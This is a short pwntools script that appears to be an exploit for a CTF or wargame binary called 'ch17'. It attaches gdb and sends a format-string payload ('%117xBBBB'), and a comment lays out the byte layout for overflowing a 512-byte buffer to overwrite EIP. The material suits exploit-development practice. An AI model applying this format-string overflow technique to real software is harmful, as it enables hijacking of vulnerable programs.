from pwn import *


context.terminal = ['tmux', 'splitw' ,'-h']


# remote
#s = ssh()
#p = s.process()

p = process("./ch17")
gdb.attach(p, '''
break *0x8049050
break *0x08049248
break *0x08049261
break *0x080492ab
''')


# --------------------------------------------------------------------------|
#         CONSTANT STRING |  %400s        |  %105x         |  EIP OVERFLOW  |
# buffer[     16 bytes    +  400 bytes    +  105 bytes     +  4 bytes = 525 |
# --------------------------------------------------------------------------|

# outbuf[512]



payload = ""
payload += "%117xBBBB"

p.sendline(payload)
p.interactive()
